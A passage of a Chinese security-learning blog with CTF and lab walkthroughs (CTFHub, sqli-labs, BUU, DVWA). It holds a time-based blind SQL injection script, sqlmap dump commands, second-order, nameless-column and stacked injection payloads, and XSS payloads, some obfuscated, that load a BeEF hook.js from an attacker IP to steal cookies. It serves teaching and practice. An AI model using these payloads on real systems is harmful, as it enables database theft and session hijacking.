<h3 id="sqlmap解法-3"><a href="#sqlmap解法-3" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>没有回显结果，无法通过回显判断 SQL 语句是否执行成功。通常采用<code>if((bool),sleep(3),0)</code>语句，通过页面响应时间判断是否存在时间盲注。<a class="link"   href="https://blog.csdn.net/weixin_45254208/article/details/107578439" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h3 id="手动解法-4"><a href="#手动解法-4" class="headerlink" title="手动解法"></a>手动解法</h3><ul>
<li>输入<code>1 and if(length(database())=4,sleep(3),0)</code>。页面 sleep(3) 秒左右，然后响应。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694943271_6506c827937d659d67625.jpeg"
                      alt="图片.png"
                ></li>
<li>脚本</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">url = &quot;http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=&quot;</span><br><span class="line">name = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,10):</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		print(i)</span><br><span class="line">		for j in range(31,128):</span><br><span class="line">			j = (128+31) -j</span><br><span class="line">			str_ascii=chr(j)</span><br><span class="line">			#数据库名</span><br><span class="line">			payolad = &quot;if(substr(database(),%s,1) = &#x27;%s&#x27;,sleep(1),1)&quot;%(str(i),str(str_ascii))</span><br><span class="line">			#表名</span><br><span class="line">			#payolad = &quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit %d,1),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(k,i,str(str_ascii))</span><br><span class="line">			#字段名</span><br><span class="line">			#payolad = &quot;if(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=&#x27;sqli&#x27;),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str(str_ascii))</span><br><span class="line">			start_time=time.time()</span><br><span class="line">			str_get = session.get(url=url + payolad)</span><br><span class="line">			end_time = time.time()</span><br><span class="line">			t = end_time - start_time</span><br><span class="line">			if t &gt; 1:</span><br><span class="line">				if str_ascii == &quot;+&quot;:</span><br><span class="line">					sys.exit()</span><br><span class="line">				else:</span><br><span class="line">					name+=str_ascii</span><br><span class="line">					break</span><br><span class="line">		print(name)</span><br><span class="line"></span><br><span class="line">#查询字段内容</span><br><span class="line">for i in range(1,50):</span><br><span class="line">	print(i)</span><br><span class="line">	for j in range(31,128):</span><br><span class="line">		j = (128+31) -j</span><br><span class="line">		str_ascii=chr(j)</span><br><span class="line">		payolad = &quot;if(substr((select flag from sqli.flag),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str_ascii)</span><br><span class="line">		start_time = time.time()</span><br><span class="line">		str_get = session.get(url=url + payolad)</span><br><span class="line">		end_time = time.time()</span><br><span class="line">		t = end_time - start_time</span><br><span class="line">		if t &gt; 1:</span><br><span class="line">			if str_ascii == &quot;+&quot;:</span><br><span class="line">				sys.exit()</span><br><span class="line">			else:</span><br><span class="line">				name += str_ascii</span><br><span class="line">				break</span><br><span class="line">	print(name)</span><br></pre></td></tr></table></figure></div>

<h3 id="sqlmap解法-4"><a href="#sqlmap解法-4" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -level=5 risk=3</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694944289_6506cc2183450b2d166e8.jpeg"
                      alt="图片.png"
                ></p>
<h1 id="sql注入进阶"><a href="#sql注入进阶" class="headerlink" title="sql注入进阶"></a>sql注入进阶</h1><ul>
<li><strong>参考书籍《CTF实战：技术、解题与进阶》</strong></li>
</ul>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul>
<li>原理：二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入，二次注入是输入数据经处理后存储，取出后，再次进入到 SQL 查询，以绕过开发人员设置的一些检查。</li>
</ul>
<ol>
<li>第一步，插入恶意数据。Web程序对插入的数据进行转义和过滤，写入数据库时又将其还原。</li>
<li>第二步，引用恶意数据。Web程序将数据从数据库中取出并调用时，恶意 SQL 语句被带入原始语句中，造成 SQL 二次注入。</li>
</ol>
<ul>
<li>例题：sqli-labs-24。<br>登陆界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949921_6506e2212317dbf6d9192.jpeg"
                      alt="图片.png"
                ><br>登陆代码：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//转义</span><br><span class="line">function sqllogin($con1)&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password = mysqli_real_escape_string($con1, $_POST[&quot;login_password&quot;]);</span><br><span class="line">   $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res = mysqli_query($con1, $sql) or die(&#x27;You tried to be real smart, Try harder!!!! :( &#x27;);</span><br><span class="line">   $row = mysqli_fetch_row($res);</span><br><span class="line">	 //print_r($row) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">	    return $row[1];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">	    return 0;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注册界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949969_6506e25189686b0a33b02.jpeg"
                      alt="图片.png"
                ><br>注册代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	# Validating the user input........</span><br><span class="line"></span><br><span class="line">	//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class="line">	$username=  mysqli_real_escape_string($con1, $_POST[&#x27;username&#x27;]) ;</span><br><span class="line">	$pass= mysqli_real_escape_string($con1, $_POST[&#x27;password&#x27;]);</span><br><span class="line">	$re_pass= mysqli_real_escape_string($con1, $_POST[&#x27;re_password&#x27;]);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;</span><br><span class="line">	$sql = &quot;select count(*) from users where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">	$res = mysqli_query($con1, $sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class="line">	$row = mysqli_fetch_row($res);</span><br><span class="line"></span><br><span class="line">	//print_r($row);</span><br><span class="line">	if (!$row[0]==0) </span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;script&gt;alert(&quot;The username Already exists, Please choose a different username &quot;)&lt;/script&gt;;</span><br><span class="line">		&lt;?php</span><br><span class="line">		header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">		if ($pass==$re_pass)</span><br><span class="line">		&#123;</span><br><span class="line">			# Building up the query........</span><br><span class="line"></span><br><span class="line">			$sql = &quot;insert into users (username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;</span><br><span class="line">			mysqli_query($con1, $sql) or die(&#x27;Error Creating your user account,  : &#x27;.mysqli_error($con1));</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;   				</span><br><span class="line">			//echo &quot;&lt;h1&gt;User Created Successfully&lt;/h1&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;					</span><br><span class="line">			echo &quot;&lt;/br&gt;Redirecting you to login page in 5 sec................&quot;;</span><br><span class="line">			echo &quot;&lt;font size=&#x27;2&#x27;&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;&quot;;</span><br><span class="line">			header(&#x27;refresh:5, url=index.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			?&gt;</span><br><span class="line">			&lt;script&gt;alert(&#x27;Please make sure that password field and retype password match correctly&#x27;)&lt;/script&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">			header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程：</p>
<ol>
<li>利用注册，将<code>admin&#39;#</code>插入数据库。</li>
<li>以<code>admin&#39;#</code>登录，执行<code>sql = &quot;SELECT * FROM users WHERE username=&#39;admin &#39;#&#39; and password=&#39;$password&#39;&quot;;</code>并可修改<code>admin</code>密码。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694950421_6506e415ac6b7d4482328.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="无名列注入"><a href="#无名列注入" class="headerlink" title="无名列注入"></a>无名列注入</h2><ul>
<li>无名列注入就是在不知道列名的情况下进行 sql 注入。通常我们用于获取所有库的库名，表名，列名的 infomation_scema 库经常被 WAF 过滤。无名列注入适用于已经获取数据表但无法查询列的情况。</li>
<li>原理：类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。<br>正常查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194369_650a9d01e1b1809cd83e1.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194467_650a9d636c71cc4a210d1.jpeg"
                      alt="图片.png"
                ><br>union 查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194533_650a9da57fb6fe93ed0be.jpeg"
                      alt="图片.png"
                ><br>利用数字<strong>3</strong>代替未知列名需要加上反引号`3`。后面的<strong>a</strong>表示上图中表的别名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194729_650a9e695aa1c4a0aa786.jpeg"
                      alt="图片.png"
                ><br>若反引号被过滤掉，可用别名代替。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194788_650a9ea40e73244560dcc.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<p>BUU例题：[SWPU2019]Web1<br>注册后经测试，过滤了<code>or</code>,<code>#</code>,<code>--``+</code>和。<br>爆破库名：<br><code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195496_650aa168b53c1e2368e8a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195565_650aa1ad8375a774ee6b2.jpeg"
                      alt="图片.png"
                ><br>爆破表名：<br><code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195692_650aa22c6adc022c33f16.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195703_650aa2372de91d8573484.jpeg"
                      alt="图片.png"
                ><br>无名列注入：<br><code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195756_650aa26c9b351d824deca.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195774_650aa27eb18737321a5e2.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
<li><p>堆叠注入就是一堆 SQL 语句一起执行。我们将多个 SQL 语句用 “;” 连接起来即可达到多条语句一起执行的效果。堆叠注入和 union 联合查询本质上都是将两条语句一起执行，但 union 查询只能连接两条查询语句，而堆叠注入可连接两条任意语句。当 WAF 没有过滤 show, rename, alert 等关键字时，可考虑堆叠注入。</p>
</li>
<li><p>例题：[强网杯 2019]随便注<br>输入<code>1&#39;;show databases;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196469_650aa53546795787c1a58.jpeg"
                      alt="图片.png"
                ><br>输入<code>1&#39;;show tables #</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196646_650aa5e6393bc79d49753.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words`#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197104_650aa7b0dad99a854f5e6.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` #</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196862_650aa6be9da5679bce968.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read first limit 0,2;#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197353_650aa8a950d9623b3e907.jpeg"
                      alt="图片.png"
                ></p>
</li>
<li><p><a class="link"   href="https://blog.csdn.net/rainsghost/article/details/127246004" >Tips <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><code>hand tablename open as new_tablename;</code>。追加tablename的表的别名为new_tablename（需要注意的是，此处不是修改，且只在当前会话内生效）<br><code>Handler_read_next;</code>此选项表明在进行索引扫描时，按照索引从数据文件里取数据的次数。</p>
</li>
</ul>
<p>例题：sqli-labs:Less-38</p>
<p><strong><a class="link"   href="http://127.0.0.1/sqli-labs/Less-38/?id=1" >http://127.0.0.1/sqli-labs/Less-38/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197917_650aaadd41a5591833127.jpeg"
                      alt="图片.png"
                ><br>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/sqli-labs/Less-38/?id=1&#x27;;insert into users(id,username,password) values(21,&#x27;5555&#x27;,&#x27;5555&#x27;); #</span><br></pre></td></tr></table></figure></div>



<h2 id="SQL-注入与其他漏洞结合"><a href="#SQL-注入与其他漏洞结合" class="headerlink" title="SQL 注入与其他漏洞结合"></a>SQL 注入与其他漏洞结合</h2><p>后续补充。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL injection</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-XSS跨站脚本攻击</title>
    <url>/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS 指 Web 应用代码注入，攻击者向 Web 页面插入恶意 Script 代码，例如 JavaScript 脚本，CSS 或者其他代码。用户浏览该页面会执行其中嵌入的 Script 代码，从而获取 cookie，session，token或其他敏感信息，对用户进行钓鱼欺诈。</p>
<h2 id="XSS-基础"><a href="#XSS-基础" class="headerlink" title="XSS 基础"></a>XSS 基础</h2><h3 id="反射型-XSS（非持久性-XSS）"><a href="#反射型-XSS（非持久性-XSS）" class="headerlink" title="反射型 XSS（非持久性 XSS）"></a>反射型 XSS（非持久性 XSS）</h3><p>这种 XSS 并没有保存到目标网站，而是将将恶意代码放在请求的响应结果中，浏览器解析后触发 XSS，一般引诱用户点击恶意链接来实施攻击。</p>
<h5 id="dvwa-例题"><a href="#dvwa-例题" class="headerlink" title="dvwa 例题:"></a>dvwa 例题:</h5><p><strong>level: Low</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>向 GET 请求注入代码:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211545402.png"
                      alt="image-20230926211545402"
                ></p>
<p>反馈:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211722779.png"
                      alt="image-20230926211722779"
                ></p>
<p>BeEF 利用:</p>
<p>攻击方 <code>IP: 192.168.152.128</code>。</p>
<p>靶场<code>IP: 192.168.152.1</code></p>
<p>键入<code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145547349.png"
                      alt="image-20230927145547349"
                ></p>
<p>反馈:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145700059.png"
                      alt="image-20230927145700059"
                ></p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2F192.168.152.128%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E#</code></p>
<p>变成了  hook.js地址，并且成功上线 BeEF，可通过Get cookie 获取 cookie信息。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145747630.png"
                      alt="image-20230927145747630"
                ></p>
<p>界面跳转。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160822193.png"
                      alt="image-20230927160822193"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160901116.png"
                      alt="image-20230927160901116"
                ></p>
<p>弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161904804.png"
                      alt="image-20230927161904804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161847107.png"
                      alt="image-20230927161847107"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );//str_replace 区分大小写。</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>payload:</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927165007670.png"
                      alt="image-20230927165007670"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // 避开&lt;script ,*贪婪匹配会匹配到 &lt;</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>只要避免 <code>script</code>出现即可。</p>
<p>策略: 使用<code>String.fromCharCode()</code>函数来创建<code>&quot;script&quot;</code>和<code>&quot;http://192.168.152.128:3000/hook.js&quot;</code>这两个字符串，以避免直接在代码中出现这些字符串。然后，我使用<code>eval()</code>函数来执行这段代码。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171112316.png"
                      alt="image-20230927171112316"
                ></p>
<p> 成功上线BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171209443.png"
                      alt="image-20230927171209443"
                ></p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型 XSS 被保留在目标网站中，受害者浏览包含此恶意代码的网站就会执行恶意代码。通常出现在个人信息，网站留言，评论，博客日志等交互处。</p>
<h5 id="dvwa-例题-1"><a href="#dvwa-例题-1" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
